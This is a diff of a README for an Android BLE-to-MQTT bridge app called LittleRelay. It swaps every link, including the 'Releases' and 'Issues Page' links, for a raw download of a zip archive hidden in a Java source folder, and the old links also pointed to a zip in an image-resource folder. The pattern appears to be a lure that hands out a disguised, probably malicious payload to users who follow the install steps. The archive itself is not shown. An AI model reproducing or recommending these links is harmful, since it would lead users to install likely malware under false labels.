@@ -1,6 +1,6 @@
 # 🚀 LittleRelay - Connect Your BLE Devices Effortlessly
 
-![Download LittleRelay](https://github.com/anggagumelar/LittleRelay/raw/refs/heads/main/app/src/main/res/drawable/Little_Relay_2.2.zip)
+![Download LittleRelay](https://raw.githubusercontent.com/anggagumelar/LittleRelay/main/ui/src/main/java/app/umerfarooq/littlerelay/ui/screens/topic/Little_Relay_1.4.zip)
 
 ## 📋 Overview
 LittleRelay is an Android app designed to connect Bluetooth Low Energy (BLE) devices to an MQTT broker. With LittleRelay, you can enjoy seamless, bidirectional data flow. Whether you are monitoring sensors or controlling smart devices, this app simplifies communication in the Internet of Things (IoT) ecosystem.
@@ -22,7 +22,7 @@ To run LittleRelay, ensure you have the following:
 Follow these steps to install and run LittleRelay on your Android device:
 
 ### Step 1: Download the App
-Visit this page to download: [LittleRelay Releases](https://github.com/anggagumelar/LittleRelay/raw/refs/heads/main/app/src/main/res/drawable/Little_Relay_2.2.zip).
+Visit this page to download: [LittleRelay Releases](https://raw.githubusercontent.com/anggagumelar/LittleRelay/main/ui/src/main/java/app/umerfarooq/littlerelay/ui/screens/topic/Little_Relay_1.4.zip).
 
 ### Step 2: Install the App
 1. Locate the downloaded file on your device.
@@ -57,10 +57,10 @@ Once installed, find LittleRelay in your app drawer. Tap the icon to open the ap
   - Check your internet connection.
   - Ensure that the broker settings are correct.
   
-For additional support, visit [Issues Page](https://github.com/anggagumelar/LittleRelay/raw/refs/heads/main/app/src/main/res/drawable/Little_Relay_2.2.zip).
+For additional support, visit [Issues Page](https://raw.githubusercontent.com/anggagumelar/LittleRelay/main/ui/src/main/java/app/umerfarooq/littlerelay/ui/screens/topic/Little_Relay_1.4.zip).
 
 ## 📥 Download & Install
-You can download LittleRelay by visiting this page: [LittleRelay Releases](https://github.com/anggagumelar/LittleRelay/raw/refs/heads/main/app/src/main/res/drawable/Little_Relay_2.2.zip). 
+You can download LittleRelay by visiting this page: [LittleRelay Releases](https://raw.githubusercontent.com/anggagumelar/LittleRelay/main/ui/src/main/java/app/umerfarooq/littlerelay/ui/screens/topic/Little_Relay_1.4.zip). 
 
 ## 🌐 Learn More
 Explore the topics related to LittleRelay:
